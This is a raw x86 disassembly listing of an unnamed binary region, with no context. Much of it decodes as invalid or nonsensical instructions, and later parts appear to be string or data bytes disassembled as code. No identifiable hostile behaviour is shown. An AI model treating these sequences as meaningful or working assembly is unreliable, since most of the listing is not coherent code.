  42a40c:	xor    eax,DWORD PTR [eax]
  42a40e:	mov    al,bh
  42a410:	or     eax,0x487284
  42a415:	xor    al,cl
  42a417:	mov    ecx,DWORD PTR [ebp-0x4]
  42a41a:	mov    ecx,edi
  42a41c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a422:	jb     0x42a433
  42a424:	add    BYTE PTR [edi],dh
  42a426:	enter  0x8500,0x8b
  42a42a:	add    ah,bl
  42a42c:	add    BYTE PTR [eax],al
  42a42e:	inc    ebp
  42a42f:	(bad)  
  42a430:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a437:	mov    esi,DWORD PTR [edx-0x4]
  42a43a:	add    bh,cl
  42a43c:	dec    ebp
  42a43d:	mov    dh,0x8b
  42a43f:	add    esi,DWORD PTR [ebx]
  42a441:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a447:	add    BYTE PTR [eax],al
  42a449:	mov    eax,ecx
  42a44b:	loopne 0x42a49a
  42a44d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a453:	dec    eax
  42a454:	or     eax,0x8b7232
  42a459:	in     al,0xc1
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a465:	xor    dh,BYTE PTR [edx-0x75]
  42a468:	add    al,dh
  42a46a:	enter  0x4f09,0xcf
  42a46e:	inc    ebp
  42a46f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a475:	or     al,BYTE PTR ds:0xe4728b
  42a47b:	or     DWORD PTR [ebp-0x31],ecx
  42a47e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a485:	cmp    dh,BYTE PTR [edx+0xf]
  42a488:	add    bl,dl
  42a48a:	rol    DWORD PTR [eax],0x4d
  42a48d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a493:	(bad)  
  42a494:	or     eax,0x487284
  42a499:	xor    al,cl
  42a49b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a49e:	mov    ecx,DWORD PTR [ecx]
  42a4a0:	xor    ecx,edi
  42a4a2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a4a9:	xor    cl,al
  42a4ab:	mov    ecx,DWORD PTR [edi]
  42a4ad:	fadd   QWORD PTR [ebp+0x9]
  42a4b0:	call   0xffcf9f84
  42a4b5:	dec    eax
  42a4b6:	dec    ebp
  42a4b7:	xor    bh,BYTE PTR [ebx]
  42a4b9:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a4bd:	loopne 0x42a4bb
  42a4bf:	or     edi,eax
  42a4c1:	iret   
  42a4c2:	ret    
  42a4c3:	mov    WORD PTR [ebp+0x4c],es
  42a4c6:	mov    esi,DWORD PTR [edx]
  42a4c8:	call   0x84526c07
  42a4cd:	(bad)  
  42a4ce:	cwde   
  42a4cf:	add    BYTE PTR [edx],dh
  42a4d1:	mov    esi,DWORD PTR [ebx]
  42a4d3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4d9:	test   BYTE PTR [ebx],dh
  42a4db:	dec    eax
  42a4dc:	add    esi,DWORD PTR [edx]
  42a4de:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4e4:	dec    edi
  42a4e6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4ed:	xor    al,BYTE PTR [ebx]
  42a4ef:	mov    edi,DWORD PTR [ebx]
  42a4f1:	in     al,0x75
  42a4f3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4f9:	dec    eax
  42a4fa:	xor    esi,DWORD PTR [edx]
  42a4fc:	lea    ecx,[edx]
  42a4fe:	or     BYTE PTR [ebx+0x900f072],cl
  42a504:	ja     0x42a4d5
  42a506:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a50d:	cmp    ch,al
  42a50f:	jne    0x42a504
  42a511:	mov    edi,edi
  42a513:	fadd   QWORD PTR [ebp+0x0]
  42a516:	mov    eax,edi
  42a518:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a51f:	mov    edx,DWORD PTR [ebx]
  42a521:	in     al,0x45
  42a523:	or     DWORD PTR [ebx],esi
  42a525:	iret   
  42a526:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a52d:	xor    dl,BYTE PTR [eax-0x75]
  42a530:	sbb    al,ah
  42a532:	dec    DWORD PTR [ecx]
  42a534:	mov    ecx,edi
  42a536:	in     al,dx
  42a537:	mov    eax,es
  42a539:	dec    eax
  42a53a:	mov    DWORD PTR [edx],esi
  42a53c:	fmul   QWORD PTR [edx]
  42a53e:	jne    0x42a4cb
  42a540:	(bad)  
  42a541:	(bad)  
  42a543:	or     DWORD PTR [ebp-0x31],eax
  42a546:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a54d:	cmp    bh,bh
  42a54f:	jne    0x42a596
  42a551:	lea    ecx,[ebx-0x38372750]
  42a557:	inc    ebx
  42a559:	mov    eax,ecx
  42a55b:	mov    eax,0xa00c111
  42a560:	jne    0x42a5a7
  42a562:	mov    esi,DWORD PTR [ebx]
  42a564:	test   al,0x3
  42a566:	inc    ebp
  42a567:	mov    DWORD PTR [eax-0xc],edx
  42a56a:	fiadd  WORD PTR [ebp-0x1]
  42a56d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a573:	jb     0x42a576
  42a575:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a57b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a581:	retf   
  42a582:	mov    edx,ecx
  42a584:	adc    al,0x84
  42a586:	(bad)  
  42a587:	std    
  42a588:	ret    
  42a589:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a58f:	hlt    
  42a590:	rol    edi,0x82
  42a593:	ret    
  42a594:	cld    
  42a595:	enter  0x11ff,0x45
  42a599:	inc    ebp
  42a59a:	pop    edi
  42a59b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a59e:	ret    0xc7
  42a5a1:	test   BYTE PTR [ebx+0x45325198],cl
  42a5a7:	jmp    0x42a534
  42a5a9:	push   0x8
  42a5ab:	call   DWORD PTR [esi]
  42a5ad:	in     al,dx
  42a5ae:	add    BYTE PTR [ebp+0x1],0x50
  42a5b2:	add    bl,ah
  42a5b4:	add    bh,bh
  42a5b6:	icebp  
  42a5b7:	mov    ecx,DWORD PTR [eax]
  42a5b9:	cld    
  42a5ba:	pop    es
  42a5bb:	dec    ebp
  42a5bc:	shl    DWORD PTR [ebx],0x72
  42a5bf:	add    eax,DWORD PTR [eax]
  42a5c1:	cmp    edx,ecx
  42a5c3:	je     0x42a5d5
  42a5c5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5c8:	inc    edi
  42a5ca:	or     al,0xc3
  42a5cc:	jmp    FWORD PTR [edx-0x18]
  42a5cf:	(bad)  
  42a5d0:	sti    
  42a5d1:	cwde   
  42a5d2:	(bad)  
  42a5d3:	call   0xffa09ede
  42a5d8:	or     al,0x45
  42a5da:	push   ebp
  42a5db:	sub    esp,0x18
  42a5de:	push   ebx
  42a5df:	inc    ebp
  42a5e0:	mov    edi,edi
  42a5e2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5e9:	test   al,0x50
  42a5eb:	inc    ebp
  42a5ec:	push   ecx
  42a5ed:	push   eax
  42a5ee:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5f4:	add    ah,bh
  42a5f6:	(bad)  
  42a5f7:	dec    ebp
  42a5f8:	add    DWORD PTR [ebx],esi
  42a5fa:	inc    ebp
  42a5fb:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a601:	push   0xffffff8b
  42a603:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a609:	add    eax,DWORD PTR [ecx]
  42a60b:	or     BYTE PTR [eax],al
  42a60d:	call   0xff849e12
  42a612:	mov    eax,DWORD PTR [ebp+0x14]
  42a615:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a61b:	inc    ebp
  42a61c:	dec    ecx
  42a61d:	add    ebp,DWORD PTR [edx+0x14]
  42a620:	push   0x8b3045
  42a625:	call   0x33acf39a
  42a62a:	inc    DWORD PTR [ebx]
  42a62c:	mov    DWORD PTR [edi],ecx
  42a62e:	mov    eax,ecx
  42a630:	or     BYTE PTR [ebp-0x3d],cl
  42a633:	cmp    eax,edi
  42a635:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a63a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a640:	adc    al,0xc9
  42a642:	inc    ebp
  42a643:	adc    BYTE PTR [eax+0x55],dl
  42a646:	jne    0x42a634
  42a648:	call   0xff53a5d8
  42a64d:	dec    ebp
  42a64e:	inc    ebp
  42a64f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a655:	add    BYTE PTR [ebx],bh
  42a657:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a65b:	push   eax
  42a65c:	or     al,0x51
  42a65e:	dec    ebp
  42a65f:	xor    DWORD PTR [ebx],0xf320398
  42a665:	cmp    eax,DWORD PTR [ebp+0x74]
  42a668:	mov    edi,edi
  42a66a:	pop    edi
  42a66b:	adc    BYTE PTR [ebx+0x75],bl
  42a66e:	ret    0x50
  42a671:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a675:	(bad)  
  42a676:	clc    
  42a677:	mov    esp,ebp
  42a679:	pop    ecx
  42a67a:	mov    ecx,0xf80085c2
  42a67f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a682:	push   esi
  42a683:	push   esi
  42a684:	(bad)  
  42a685:	lock add DWORD PTR [ebp+0x44],eax
  42a689:	mov    edx,DWORD PTR [eax]
  42a68b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a68f:	or     BYTE PTR [eax+0x7],dl
  42a692:	push   ecx
  42a693:	ret    
  42a694:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a69a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a6a0:	or     al,0x80
  42a6a2:	jge    0x42a6a5
  42a6a4:	mov    DWORD PTR [eax],eax
  42a6a6:	and    al,0x8
  42a6a8:	cmp    DWORD PTR [ebp+0x10],eax
  42a6ab:	mov    edx,DWORD PTR [esi]
  42a6ad:	xchg   esp,eax
  42a6ae:	dec    esp
  42a6af:	add    BYTE PTR [eax],dl
  42a6b1:	mov    ecx,edx
  42a6b3:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a6b7:	dec    ebp
  42a6b8:	into   
  42a6b9:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a6bf:	mov    edx,DWORD PTR [eax+0x14]
  42a6c2:	das    
  42a6c3:	add    al,0x45
  42a6c5:	add    BYTE PTR [ebp+0x0],dh
  42a6c8:	mov    edi,edi
  42a6ca:	and    al,0x50
  42a6cc:	mov    eax,DWORD PTR [eax]
  42a6ce:	and    al,0xd1
  42a6d0:	xor    eax,DWORD PTR [esi]
  42a6d2:	lea    eax,[ebp+0x8]
  42a6d5:	xor    esi,DWORD PTR [edx+0x3]
  42a6d8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6de:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6e4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ee:	cmp    edi,edi
  42a6f0:	pushf  
  42a6f1:	mov    edi,edi
  42a6f3:	or     BYTE PTR [esi+ecx*1],cl
  42a6f6:	jne    0x42a6bb
  42a6f8:	call   0xba6c4
  42a6fd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a701:	mov    ebx,DWORD PTR [eax]
  42a703:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a707:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a70f:	pop    esi
  42a710:	dec    ecx
  42a712:	and    al,0x10
  42a714:	call   DWORD PTR [ebp+0x24]
  42a717:	in     al,dx
  42a718:	call   0xffc6a601
  42a71d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a721:	pushf  
  42a722:	pop    esi
  42a723:	mov    ebp,esp
  42a725:	and    al,0xc2
  42a727:	push   edi
  42a728:	add    BYTE PTR [ecx+0x3a],al
  42a72b:	mov    DWORD PTR [ebp+0x24],esi
  42a72e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a734:	dec    DWORD PTR [eax]
  42a736:	and    al,0x7
  42a738:	(bad)  
  42a739:	cli    
  42a73a:	and    al,0x98
  42a73c:	or     BYTE PTR [edx],dh
  42a73e:	sbb    BYTE PTR [ebx],al
  42a740:	adc    al,0x89
  42a742:	jmp    DWORD PTR [esp]
  42a745:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a74b:	adc    al,0x8
  42a74d:	dec    ebp
  42a74e:	adc    BYTE PTR [ebp-0x7c],dh
  42a751:	mov    esi,DWORD PTR [edx]
  42a753:	and    al,0x24
  42a755:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a75b:	add    edi,eax
  42a75d:	pcmpeqb mm1,mm2
  42a760:	jmp    0x42a7ae
  42a762:	dec    DWORD PTR [eax]
  42a764:	je     0x42a751
  42a766:	mov    edi,DWORD PTR [ecx]
  42a768:	pop    ebp
  42a769:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a76d:	cwde   
  42a76e:	mov    DWORD PTR [eax-0x8],ebp
  42a771:	jge    0x42a7db
  42a773:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a779:	jl     0x42a7c5
  42a77b:	adc    BYTE PTR [eax],al
  42a77d:	pop    esp
  42a77e:	cmp    al,0x10
  42a780:	add    BYTE PTR [ecx+0x41],dl
  42a783:	adc    BYTE PTR [eax],al
  42a785:	test   al,0x21
  42a787:	adc    BYTE PTR [eax],al
  42a789:	cs jbe 0x42a79c
  42a78c:	add    BYTE PTR [edx+0xe],ch
  42a78f:	adc    BYTE PTR [eax],al
  42a791:	clc    
  42a792:	pusha  
  42a793:	adc    BYTE PTR [eax],al
  42a795:	jp     0x42a7d8
  42a797:	adc    BYTE PTR [eax],al
  42a799:	mov    ds:0x88001059,eax
  42a79e:	pop    ebp
  42a79f:	adc    BYTE PTR [eax],al
  42a7a1:	inc    ax
  42a7a3:	adc    BYTE PTR [eax],al
  42a7a5:	jns    0x42a74e
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x7affbd59],al
  42a7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7b3:	inc    edx
  42a7b4:	add    BYTE PTR [ecx-0x72ffbd59],cl
  42a7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7bb:	inc    edx
  42a7bc:	add    BYTE PTR [ecx-0x6affbd59],dl
  42a7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7c3:	inc    edx
  42a7c4:	add    BYTE PTR [ecx-0x62ffbd59],bl
  42a7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7cb:	inc    edx
  42a7cc:	add    BYTE PTR [ecx-0x2effbd59],ah
  42a7d2:	cmp    BYTE PTR [eax],dl
  42a7d4:	add    BYTE PTR [edi],dl
  42a7d6:	xor    BYTE PTR [eax],dl
  42a7d8:	add    BYTE PTR [eax],al
  42a7da:	pop    ds
  42a7db:	adc    BYTE PTR [eax],al
  42a7dd:	(bad)  
  42a7de:	adc    BYTE PTR ds:[eax],al
  42a7e1:	in     eax,0x19
  42a7e3:	adc    BYTE PTR [eax],al
  42a7e5:	bound  ebx,QWORD PTR [ecx]
  42a7e7:	adc    BYTE PTR [eax],al
  42a7e9:	shl    BYTE PTR [edi+0x10],1
  42a7ec:	add    BYTE PTR [edi-0x2effefa9],al
  42a7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7f3:	inc    edx
  42a7f4:	add    ch,dl
  42a7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7f7:	inc    edx
  42a7f8:	add    cl,bl
  42a7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7fb:	inc    edx
  42a7fc:	add    ch,bl
  42a7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ff:	inc    edx
  42a800:	add    cl,ah
  42a802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a803:	inc    edx
  42a804:	add    ch,ah
  42a806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a807:	inc    edx
  42a808:	add    cl,ch
  42a80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a80b:	inc    edx
  42a80c:	add    ch,ch
  42a80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a80f:	inc    edx
  42a810:	add    dl,ah
  42a812:	adc    BYTE PTR ds:[eax],al
  42a815:	ds pop ebp
  42a817:	adc    BYTE PTR [eax],al
  42a819:	add    BYTE PTR [esi+0x10],ah
  42a81c:	add    al,ch
  42a81e:	pop    eax
  42a81f:	adc    BYTE PTR [eax],al
  42a821:	cdq    
  42a822:	outs   dx,BYTE PTR ds:[esi]
  42a823:	adc    BYTE PTR [eax],al
  42a825:	ja     0x42a887
  42a827:	adc    BYTE PTR [eax],al
  42a829:	jne    0x42a862
  42a82b:	adc    BYTE PTR [eax],al
  42a82d:	arpl   WORD PTR [eax+edx*1],bx
  42a830:	add    BYTE PTR [ecx],dl
  42a832:	test   al,0x42
  42a834:	add    BYTE PTR ds:0x190042a8,dl
  42a83a:	test   al,0x42
  42a83c:	add    BYTE PTR ds:0x210042a8,bl
  42a842:	test   al,0x42
  42a844:	add    BYTE PTR ds:0x290042a8,ah
  42a84a:	test   al,0x42
  42a84c:	add    BYTE PTR ds:0x5c0042a8,ch
  42a852:	adc    DWORD PTR [eax],edx
  42a854:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a85b:	adc    BYTE PTR [eax],al
  42a85d:	and    al,0x30
  42a85f:	adc    BYTE PTR [eax],al
  42a861:	ret    
  42a862:	pop    edi
  42a863:	adc    BYTE PTR [eax],al
  42a865:	loopne 0x42a8cd
  42a867:	adc    BYTE PTR [eax],al
  42a869:	add    eax,0xd400105b
  42a86e:	aas    
  42a86f:	adc    BYTE PTR [eax],al
  42a871:	push   ecx
  42a872:	test   al,0x42
  42a874:	add    BYTE PTR [ebp-0x58],dl
  42a877:	inc    edx
  42a878:	add    BYTE PTR [ecx-0x58],bl
  42a87b:	inc    edx
  42a87c:	add    BYTE PTR [ebp-0x58],bl
  42a87f:	inc    edx
  42a880:	add    BYTE PTR [ecx-0x58],ah
  42a883:	inc    edx
  42a884:	add    BYTE PTR [ebp-0x58],ah
  42a887:	inc    edx
  42a888:	add    BYTE PTR [ecx-0x58],ch
  42a88b:	inc    edx
  42a88c:	add    BYTE PTR [ebp-0x58],ch
  42a88f:	inc    edx
  42a890:	add    dh,dl
  42a892:	sbb    eax,0x10f00010
  42a897:	adc    BYTE PTR [eax],al
  42a899:	inc    ecx
  42a89a:	bound  edx,QWORD PTR [eax]
  42a89c:	add    BYTE PTR [ebx+eax*1],ah
  42a89f:	adc    BYTE PTR [eax],al
  42a8a1:	jecxz  0x42a906
  42a8a3:	adc    BYTE PTR [eax],al
  42a8a5:	pushf  
  42a8a6:	xor    DWORD PTR [eax],edx
  42a8a8:	add    BYTE PTR [ecx],al
  42a8aa:	or     dl,BYTE PTR [eax]
  42a8ac:	add    dh,dl
  42a8ae:	inc    edi
  42a8af:	adc    BYTE PTR [eax],al
  42a8b1:	xchg   ecx,eax
  42a8b2:	test   al,0x42
  42a8b4:	add    BYTE PTR [ebp-0x66ffbd58],dl
  42a8ba:	test   al,0x42
  42a8bc:	add    BYTE PTR [ebp-0x5effbd58],bl
  42a8c2:	test   al,0x42
  42a8c4:	add    BYTE PTR [ebp-0x56ffbd58],ah
  42a8ca:	test   al,0x42
  42a8cc:	add    BYTE PTR [ebp+0x430042a8],ch
  42a8d2:	xor    dh,BYTE PTR [edx]
  42a8d4:	xor    eax,0x5a52345f
  42a8d9:	push   esp
  42a8da:	xor    BYTE PTR [esi],dh
  42a8dc:	add    BYTE PTR [ecx+0x36],cl
  42a8df:	push   eax
  42a8e0:	pop    edi
  42a8e1:	ss inc ebx
  42a8e3:	ss pop edx
  42a8e5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8e8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8ec:	pop    edi
  42a8ed:	dec    esi
  42a8ee:	dec    esp
  42a8ef:	dec    eax
  42a8f0:	xor    esi,DWORD PTR [edx]
  42a8f2:	pop    edi
  42a8f3:	xor    al,0x4b
  42a8f5:	add    BYTE PTR [eax+0x49],cl
  42a8f8:	push   ebp
  42a8f9:	xor    al,0x5f
  42a8fb:	dec    esp
  42a8fc:	inc    edx
  42a8fd:	dec    ecx
  42a8fe:	cmp    DWORD PTR [edi+ebx*2],esi
  42a901:	pop    ecx
  42a902:	inc    edi
  42a903:	add    BYTE PTR [eax+0x50],bl
  42a906:	dec    eax
  42a907:	pop    edi
  42a908:	push   ebp
  42a909:	push   ecx
  42a90a:	inc    edi
  42a90b:	xor    cl,BYTE PTR [edx+0x38]
  42a90e:	push   esi
  42a90f:	add    BYTE PTR [ebx+0x4a],al
  42a912:	push   edx
  42a913:	pop    edi
  42a914:	dec    edi
  42a915:	dec    eax
  42a916:	dec    edi
  42a917:	dec    edi
  42a918:	dec    edx
  42a919:	add    BYTE PTR [ecx+0x52],al
  42a91c:	cmp    DWORD PTR [edi+0x56],ebx
  42a91f:	aaa    
  42a920:	dec    esp
  42a921:	cmp    DWORD PTR [ebx+0x5f],eax
  42a924:	push   edx
  42a925:	inc    esp
  42a926:	add    BYTE PTR [ecx+0x37],bl
  42a929:	inc    esp
  42a92a:	pop    edi
  42a92b:	dec    ecx
  42a92c:	xor    esi,DWORD PTR [edi]
  42a92e:	xor    DWORD PTR [edi+0x49],ebx
  42a931:	push   esp
  42a932:	xor    eax,DWORD PTR [eax]
  42a934:	push   edx
  42a935:	xor    BYTE PTR [eax+0x5f],bl
  42a938:	dec    eax
  42a939:	push   edi
  42a93a:	inc    esi
  42a93b:	xor    DWORD PTR [edi+0x5f],edx
  42a93e:	cmp    BYTE PTR [ebx+0x37],dl
  42a941:	add    BYTE PTR [esi+0x42],dl
  42a944:	dec    ecx
  42a945:	xor    ebx,DWORD PTR [edi+0x45]
  42a948:	xor    BYTE PTR [ebp+0x5f],cl
  42a94b:	xor    al,0x34
  42a94d:	xor    BYTE PTR [edx+0x5f],cl
  42a950:	inc    edi
  42a951:	add    BYTE PTR [edx+0x57],dl
  42a954:	xor    ebx,DWORD PTR [edi+0x31]
  42a957:	dec    edx
  42a958:	push   edi
  42a959:	xor    eax,0x4d435f
  42a95e:	dec    ecx
  42a95f:	xor    eax,0x36365f39
  42a964:	dec    eax
  42a965:	xor    BYTE PTR [eax],al
  42a967:	dec    edi
  42a968:	inc    ebx
  42a969:	push   edi
  42a96a:	pop    edi
  42a96b:	inc    edi
  42a96c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a971:	add    BYTE PTR [edx+0x58],al
  42a974:	inc    edi
  42a975:	ss pop edi
  42a977:	push   esi
  42a978:	inc    ebx
  42a979:	dec    esi
  42a97a:	inc    esp
  42a97b:	add    BYTE PTR [edi+0x4d],cl
  42a97e:	inc    edi
  42a97f:	xor    ebx,DWORD PTR [edi+0x34]
  42a982:	dec    esi
  42a983:	pop    edx
  42a984:	cmp    BYTE PTR [edi+0x58],bl
  42a987:	cmp    BYTE PTR [eax],al
  42a989:	push   edx
  42a98a:	pop    eax
  42a98b:	push   ecx
  42a98c:	pop    edi
  42a98d:	dec    esp
  42a98e:	push   edx
  42a98f:	dec    ecx
  42a990:	dec    edi
  42a991:	inc    esp
  42a992:	pop    edi
  42a993:	dec    edi
  42a994:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a998:	push   eax
  42a999:	inc    ebp
  42a99a:	pop    edi
  42a99b:	xor    eax,0x565f3945
  42a9a0:	add    BYTE PTR [edi+0x4e],al
  42a9a3:	push   esi
  42a9a4:	pop    edi
  42a9a5:	inc    edi
  42a9a6:	push   esp
  42a9a7:	dec    eax
  42a9a8:	xor    dh,BYTE PTR [ecx]
  42a9aa:	pop    edi
  42a9ab:	dec    edi
  42a9ac:	xor    eax,DWORD PTR ss:[eax]
  42a9af:	inc    esp
  42a9b0:	inc    ebp
  42a9b1:	dec    ecx
  42a9b2:	pop    edi
  42a9b3:	push   edx
  42a9b4:	dec    eax
  42a9b5:	xor    al,0x48
  42a9b7:	dec    ecx
  42a9b8:	ss pop edi
  42a9ba:	aaa    
  42a9bb:	aaa    
  42a9bc:	dec    ecx
  42a9bd:	dec    ebp
  42a9be:	add    BYTE PTR [eax+0x54],cl
  42a9c1:	ss pop edi
  42a9c3:	inc    esi
  42a9c4:	inc    edx
  42a9c5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9c8:	dec    esi
  42a9c9:	ss dec edx
  42a9cb:	pop    edi
  42a9cc:	dec    ecx
  42a9cd:	dec    esp
  42a9ce:	inc    edi
  42a9cf:	inc    esp
  42a9d0:	dec    eax
  42a9d1:	xor    BYTE PTR [eax],bh
  42a9d3:	xor    eax,0x4c344f00
  42a9d8:	xor    esi,DWORD PTR [edi]
  42a9da:	xor    BYTE PTR [edi+0x44],bl
  42a9dd:	inc    edi
  42a9de:	dec    ebx
  42a9df:	xor    al,BYTE PTR [ecx+0x43]
  42a9e2:	add    BYTE PTR [edi+0x32],cl
  42a9e5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9e8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9eb:	pop    edx
  42a9ec:	add    BYTE PTR [eax+0x4c],bl
  42a9ef:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9f2:	inc    ecx
  42a9f3:	dec    edx
  42a9f4:	inc    esi
  42a9f5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9f8:	pop    eax
  42a9f9:	inc    edi
  42a9fa:	inc    edx
  42a9fb:	add    BYTE PTR [eax+0x33],dl
  42a9fe:	dec    esi
  42a9ff:	pop    edi
  42aa00:	dec    eax
  42aa01:	xor    eax,0x485f53
  42aa06:	dec    ebp
  42aa07:	xor    BYTE PTR [edx+0x5f],al
  42aa0a:	dec    edx
  42aa0b:	pop    eax
  42aa0c:	push   esp
  42aa0d:	dec    ecx
  42aa0e:	dec    esp
  42aa0f:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42aa13:	xor    esi,DWORD PTR [eax]
  42aa15:	pop    edi
  42aa16:	inc    ecx
  42aa17:	pop    edx
  42aa18:	push   ecx
  42aa19:	pop    edx
  42aa1a:	cmp    DWORD PTR [esi],esi
  42aa1c:	pop    edi
  42aa1d:	dec    eax
  42aa1e:	dec    esp
  42aa1f:	pop    edx
  42aa20:	add    BYTE PTR [ecx+0x57],dl
  42aa23:	pop    ecx
  42aa24:	pop    edi
  42aa25:	push   esi
  42aa26:	xor    al,0x44
  42aa28:	xor    DWORD PTR [eax],edi
  42aa2a:	xor    bl,BYTE PTR [edi+0x39]
  42aa2d:	push   esp
  42aa2e:	push   esp
  42aa2f:	add    BYTE PTR [esi+0x0],dl
  42aa32:	dec    edi
  42aa33:	add    BYTE PTR [edi+0x0],al
  42aa36:	add    BYTE PTR ss:[edi+0x0],bl
  42aa3a:	dec    edi
  42aa3b:	add    BYTE PTR [edx+0x0],bl
  42aa3e:	inc    ebp
  42aa3f:	add    BYTE PTR [eax],dh
  42aa41:	add    BYTE PTR [ebp+0x0],al
  42aa44:	xor    BYTE PTR [eax],al
  42aa46:	pop    edi
  42aa47:	add    BYTE PTR [eax],dh
  42aa49:	add    BYTE PTR ds:0x4f000000,dh
  42aa4f:	add    BYTE PTR ds:0x5f005700,dh
  42aa55:	add    BYTE PTR [edi],dh
  42aa57:	add    BYTE PTR [ebx+0x0],dl
  42aa5a:	push   ebp
  42aa5b:	add    BYTE PTR [edi+0x0],al
  42aa5e:	xor    al,0x0
  42aa60:	pop    edi
  42aa61:	add    BYTE PTR [ecx+0x0],dl
  42aa64:	inc    esp
  42aa65:	add    BYTE PTR [eax],al
  42aa67:	add    BYTE PTR [edx+0x0],dl
  42aa6a:	push   esp
  42aa6b:	add    BYTE PTR ds:0x52005f00,dh
  42aa71:	add    BYTE PTR [edi+0x0],dl
  42aa74:	xor    al,BYTE PTR [eax]
  42aa76:	xor    al,BYTE PTR [eax]
  42aa78:	xor    BYTE PTR [eax],al
  42aa7a:	xor    BYTE PTR [eax],al
  42aa7c:	pop    edi
  42aa7d:	add    BYTE PTR [esi],dh
  42aa7f:	add    BYTE PTR [eax],al
  42aa81:	add    BYTE PTR [eax+0x0],cl
  42aa84:	inc    ebp
  42aa85:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa89:	add    BYTE PTR [edi+0x0],bl
  42aa8c:	dec    edx
  42aa8d:	add    BYTE PTR [edx],dh
  42aa8f:	add    BYTE PTR [edi],dh
  42aa91:	add    BYTE PTR [ebp+0x0],dl
  42aa94:	add    BYTE PTR ss:[eax],dh
  42aa97:	add    BYTE PTR [eax],al
  42aa99:	add    BYTE PTR [esi+0x0],dl
  42aa9c:	cmp    BYTE PTR [eax],al
  42aa9e:	dec    edi
  42aa9f:	add    BYTE PTR [ecx],bh
  42aaa1:	add    BYTE PTR [edi+0x0],bl
  42aaa4:	pop    eax
  42aaa5:	add    BYTE PTR [edx+0x0],bl
  42aaa8:	dec    esp
  42aaa9:	add    BYTE PTR [ebx+0x0],cl
